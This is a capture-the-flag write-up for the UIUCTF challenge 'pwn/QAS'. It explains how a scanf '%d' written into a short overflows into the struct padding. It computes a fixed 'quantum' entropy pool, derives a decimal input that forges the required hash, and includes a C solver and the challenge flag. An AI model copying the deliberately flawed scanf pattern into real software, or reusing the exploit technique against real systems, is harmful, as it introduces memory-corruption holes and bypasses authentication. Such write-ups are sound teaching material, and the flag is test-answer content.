## pwn/QAS

**Challenge name**: pwn/QAS (richard)

**Description**: Since we are so behind on adopting "AI", corporate has decided to pivot to "quantum". They mandated we "quantumfy" our tech stack. Please review our latest authentication protocol.

`ncat --ssl qas.chal.uiuc.tf 1337`

**Files**: [handout.tar.gz](handout.tar.gz)

**TL;DR**: `scanf` type confusion vulnerability (writing a 4-byte `int` into a 2-byte `short`) allows for a buffer overflow into adjacent struct members

## Initial analysis

First, let's interact with the authentication protocol to see what the behavior is: 

```bash
$ ncat --ssl qas.chal.uiuc.tf 1337
== proof-of-work: disabled ==
=== QUANTUM AUTHENTICATION SYSTEM v2.7.3 ===
Initializing quantum security protocols...
Quantum entropy generated. System ready.
Please enter your quantum authentication code: 1234
Quantum hash computed: 0x9fee
Quantum authentication failed!
Access denied. Incident logged.
```

The program takes an integer, computes a hash, and compares it to a secret password. Our goal is to find an input that produces the correct hash. 

We are provided a `handout.tar.gz` with the source code: 

```
└── handout
    ├── Dockerfile
    ├── Makefile
    ├── chal
    └── chal.c
```

Now let's analyze the `chal.c` source code to figure out what we need to input.

We see that the quantum hash value we need to match for the password is hard-coded as `0x555`: 
```c
// Set quantum password (TODO: implement proper quantum key derivation)
qdata.password.val = 0x555;
// ...
// Verify quantum authentication
if (hashed_input == qdata.password.val) {
	access_granted();
}
```

This `qdata` is initialized in the `quantum_data_t` type:

```c
quantum_data_t qdata;
```

So what really is this custom datatype? We see that it looks a bit complicated: 

```c
// Quantum-grade type definitions for maximum security
typedef int not_int_small;
typedef short int_small;
typedef int not_int_big;
typedef not_int_small int_big;
typedef unsigned char quantum_byte;
typedef quantum_byte* quantum_ptr;

// Advanced authentication structures
typedef struct {
    not_int_big val;
} PASSWORD_QUANTUM;

typedef struct {
    int_small val;
    quantum_byte padding[2];
    quantum_byte checksum;
    quantum_byte reserved;
} INPUT_QUANTUM;

// Memory-aligned structure for optimal quantum processing
struct __attribute__((packed)) quantum_data_s {
    INPUT_QUANTUM input;
    PASSWORD_QUANTUM password;
    quantum_byte entropy_pool[8];
    quantum_byte quantum_state[16];
};

typedef struct quantum_data_s quantum_data_t;
```

But we can quickly identify that `qdata.password.val` is a `not_int_big`, which resolves to an `int`, while `qdata.input.val` is an `int_small`, which resolves to a `short`.

We see that when the program takes in a user input, it uses `scanf` with the `%d` format specifier, which expects a pointer to a standard `int` (typically 4 bytes). However, it's given the address of `qdata.input.val`, which is a `short` (typically 2 bytes). By casting `&qdata.input.val` to `(int*)`, the programmer forces `scanf` to write 4 bytes into a location that only has space for 2 bytes:

```c
// Read user input
if (scanf("%d", (int*)&qdata.input.val) != 1) {
	printf("Invalid quantum input format!\n");
	return 1;
}
```

Looking at how the `quantum_data_t` struct is initialized, we see two explicit padding bytes:

```c
// Initialize quantum security subsystem
void init_quantum_security(quantum_data_t* qdata) {
    // ...
    qdata->input.padding[0] = 0;
    qdata->input.padding[1] = 0;
}
```

So the memory layout looks like this (on little-endian):

| Byte 0            | Byte 1             | Byte 2             | Byte 3             |
| ----------------- | ------------------ | ------------------ | ------------------ |
| `input.val` (low) | `input.val` (high) | `input.padding[0]` | `input.padding[1]` |

When `scanf` writes a 4-byte integer, it overflows from `input.val` and overwrites the two `input.padding` bytes. This gives us control over the padding!

## Constructing the input

To craft the correct input, we need to understand how the hash is calculated.

We see that `quantum_data_t` has an 8-byte `entropy_pool`, which is filled by the `generate_quantum_entropy` function:

```c
// Initialize quantum security subsystem
void init_quantum_security(quantum_data_t* qdata) {
    for (int i = 0; i < 8; i++) {
        qdata->entropy_pool[i] = generate_quantum_entropy();
    }
    // ...
}
```

The `generate_quantum_entropy` function is shown below:

```c
// Quantum random number generator (patent pending)
static inline quantum_byte generate_quantum_entropy() {
    static quantum_byte seed = 0x42;
    seed = ((seed << 3) ^ (seed >> 5)) + 0x7f;
    return seed;
}
```

The `seed` is `static`, so its value persists across calls. It's always initialized to `0x42`. This means the "random" number generator is completely deterministic and will produce the same 8-byte sequence every time the program runs. 

By walking through the function, we find the constant entropy pool is `[0x91, 0x0B, 0xD7, 0x3D, 0x68, 0xC2, 0x95, 0x2B]` (see [code implementation](#code-implementation) below).

The `quantum_hash` function takes the `input` struct and the `entropy` pool to compute a value. Although `hash` is an `int`, every operation touches only the low 16 bits (XOR/OR with <=16-bit values and add an 8-bit term), so we can reason in 16-bit arithmetic for the final comparison to `0x0555`:

```c
// Quantum hash function (revolutionary technology)
not_int_big quantum_hash(INPUT_QUANTUM input, quantum_byte* entropy) {
    int_small input_val = input.val;
    not_int_big hash = input_val;

    // Apply quantum transformation matrix
    hash ^= (entropy[0] << 8) | entropy[1];
    hash ^= (entropy[2] << 4) | (entropy[3] >> 4);
    hash += (entropy[4] * entropy[5]) & 0xff;
    hash ^= entropy[6] ^ entropy[7];
    hash |= 0xeee;
    hash ^= input.padding[0] << 8 | input.padding[1];

    return hash;
}
```

We see from `hash ^= input.padding[0] << 8 | input.padding[1];` that we can just choose an input value, calculate what the hash would be right before the final XOR with our padding, and then craft a padding value that XORs the intermediate hash to our target of `0x555`. 

Let's start with the simplest 16-bit input:

```
v = 0x0000
```

Given our calculation for the fixed entropy bytes:

```
e = [0x91, 0x0B, 0xD7, 0x3D, 0x68, 0xC2, 0x95, 0x2B]
```

We calculate the hash up to the final `XOR`:

```
hash = v                 -> 0000
hash ^= 0x910B           -> 910B   (e0<<8 | e1)
hash ^= 0x0D73           -> 9C78   (e2<<4 | e3>>4 == 0xD70 | 0x3)
hash += 0x00D0           -> 9D48   ((e4*e5)&0xFF  == 0x68*0xC2 = 0x4ED0 -> 0xD0)
hash ^= 0x00BE           -> 9DF6   (e6 ^ e7       == 0x95^0x2B = 0xBE)
hash |= 0x0EEE           -> 9FFE
K = 0x9FFE  (value before XOR with padding)
```

Choose padding such that `K ^ p` is `0x0555`:

```
p = 0x9FFE ^ 0x0555 = 0x9AAB
padding[0] = 0x9A      # high byte
padding[1] = 0xAB      # low  byte
```

The program uses `scanf("%d", ...)` to read a signed decimal number from our input. To get our desired bytes into memory, we first interpret them as a 32-bit little-endian integer (`0xAB9A0000`) and then find its corresponding signed decimal value to use as input. Number we feed to `scanf` (see [code implementation](#code-implementation) below):

```
offset 0 : 0x00  (v low)
offset 1 : 0x00  (v high)
offset 2 : 0x9A  (pad high)
offset 3 : 0xAB  (pad low)
=> byte sequence 00 00 9A AB
=> 32-bit word 0xAB9A0000
=> signed decimal -1415970816
```

Entering this number as an input, we solve the challenge:

```bash
$ ncat --ssl qas.chal.uiuc.tf 1337
== proof-of-work: disabled ==
=== QUANTUM AUTHENTICATION SYSTEM v2.7.3 ===
Initializing quantum security protocols...
Quantum entropy generated. System ready.
Please enter your quantum authentication code: -1415970816
Quantum hash computed: 0x555
Quantum authentication successful!
Accessing secured vault...
CLASSIFIED FLAG: uiuctf{qu4ntum_0v3rfl0w_2d5ad975653b8f29}
```

Flag: `uiuctf{qu4ntum_0v3rfl0w_2d5ad975653b8f29}`

## Code implementation

```c
#include <stdio.h>
#include <stdint.h>

static uint8_t generate_quantum_entropy(void) {
    static uint8_t seed = 0x42;
    seed = ((seed << 3) ^ (seed >> 5)) + 0x7f;
    return seed;
}

void get_entropy_pool(uint8_t pool[8]) {
    for (int i = 0; i < 8; ++i)
        pool[i] = generate_quantum_entropy();
}

uint16_t quantum_hash(uint16_t v16, uint16_t pad16, const uint8_t e[8]) {
    uint16_t h = v16;
    h ^= (e[0] << 8) | e[1];
    h ^= (e[2] << 4) | (e[3] >> 4);
    h += (e[4] * e[5]) & 0xff;
    h ^= e[6] ^ e[7];
    h |= 0x0eee;
    h ^= pad16;
    return h;
}

uint16_t solve_padding(uint16_t v16, uint16_t target, const uint8_t e[8]) {
    uint16_t k = v16;
    k ^= (e[0] << 8) | e[1];
    k ^= (e[2] << 4) | (e[3] >> 4);
    k += (e[4] * e[5]) & 0xff;
    k ^= e[6] ^ e[7];
    k |= 0x0eee;
    return (uint16_t)(k ^ target);
}

uint32_t build_payload(uint16_t v, uint16_t pad) {
    uint8_t v_lo = v & 0xFF;
    uint8_t v_hi = (v >> 8) & 0xFF;
    uint8_t p_hi = (pad >> 8) & 0xFF; // padding[0]
    uint8_t p_lo = pad & 0xFF; // padding[1]

    return  ((uint32_t)p_lo << 24) |
            ((uint32_t)p_hi << 16) |
            ((uint32_t)v_hi <<  8) |
            ((uint32_t)v_lo);
}


int main(void) {
    uint8_t e[8];
    get_entropy_pool(e);

    puts("entropy pool:");
    for (int i = 0; i < 8; ++i)
        printf("0x%02X%s", e[i], i == 7 ? "\n\n" : ", ");

    uint16_t v   = 0x0000;
    uint16_t pad = solve_padding(v, 0x0555, e);

    printf("calculated pad = 0x%04X\n", pad);
    printf("hash(0x%04X, 0x%04X) = 0x%04X\n",
           v, pad, quantum_hash(v, pad, e));

    // combine the two halves into the 32-bit integer to feed to the server
    uint32_t payload = build_payload(v, pad);
    printf("send this decimal: %d\n", (int32_t)payload);

    return 0;
}
```

```
entropy pool:
0x91, 0x0B, 0xD7, 0x3D, 0x68, 0xC2, 0x95, 0x2B

calculated pad = 0x9AAB
hash(0x0000, 0x9AAB) = 0x0555
send this decimal: -1415970816
```